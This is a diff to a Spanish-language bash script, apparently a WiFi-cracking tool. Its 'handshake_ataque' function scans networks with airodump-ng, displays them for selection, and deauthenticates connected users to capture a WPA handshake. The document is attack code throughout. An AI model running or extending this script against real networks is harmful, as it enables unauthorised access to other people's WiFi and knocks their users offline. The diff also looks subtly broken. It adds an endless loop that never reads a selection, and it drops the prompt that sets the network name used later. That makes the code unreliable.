@@ -161,18 +161,37 @@ handshake_ataque() {
 	clear
 	echo -e "\n${turquoiseColour}[*]$grayColour Starting Handshake attack"
 	sleep 1
-	xterm -hold -e "airodump-ng $tar" &
-	airodump_xterm_PID=$!
-	echo -e "$grayColour"
  	tput cnorm
-    echo -ne "${greenColour}[?]$grayColour Que red deseas atacar?: " && read ap
+   	xterm -e "airodump-ng -w /tmp/xtermNeT --output-format csv ${tar}"
+
+	clear
+
+	while :
+	do
+	echo -e "->->->->-> Select a network <-<-<-<-<-\n\n\n"
+
+	while IFS= read -r line; do
+		macrepeat=$(grep $line /tmp/xtermNeT-01.csv | wc -l)
+
+		if [[ "$macrepeat" > 1 ]]; then
+			sed -i "s/${line}/+${line}/" /tmp/xtermNeT-01.csv
+		fi
+	done < <(cat /tmp/xtermNeT-01.csv | sed '1,2d' | cut -d "," -f 1 | sed '/Station/,1d')
+
+	rojo=$(echo -e "\e[1;31m")
+	extrojo=$(echo -e "\e[0m")
+
+	launch_irodump=$(cat /tmp/xtermNeT-01.csv | sed '1,2d' | cut -d "," -f 1,6,4,9,14 | sed 's/,/   /g; /Station/,$d' | sed '$d' | nl -w3 -s "]    " | sed 's/[0-9]/[&/' | sed "s/\[/${rojo}\[${extrojo}/g; s/\]/${rojo}\]${extrojo}/g " | sed 's/WPA2 WPA/WPA2/;s/         -/        -/;s/        -/            -/;s/[0-9][0-9][0-9]    /&-/;s/    -W/   W/g;s/    -        -/           -/g;s/WEP    /WEP     /;s/WEP      /WEP     /; s/WPA    /WPA     /;s/WPA      /WPA     / ; s/OPN    /OPN     /; s/OPN      /OPN     /; s/    $/    (Hidden Wifi)/; s/ -1    (/ -1     (/;s/    ++/ *  /; s/    +/ *  /;s/+//g')
+	echo -e "  Num          Bssid         CHN    Cifr    PWR       Essid\n******************************************************************\n$launch_irodump"
+	echo -e "\n\n  \"*\" clientes conectados"
+	echo -e "\n\n  Seleciona una red: "
+	done
+
 	echo -ne "${greenColour}[?]$grayColour En que canal esta ${ap}?: " && read channel
 	tput civis
 	$cleancolor
 	echo -e "${greenColour}[*]$grayColour Se esta desautenticando a los usuarios de la red"
 	$cleancolor
-	kill -9 $airodump_xterm_PID
-	wait $airodump_xterm_PID 2>/dev/null
 
 	xterm -hold -e "airodump-ng -c $channel -w Handshake --essid $ap $tar" &
 	airodump_filter_xterm_PID=$!
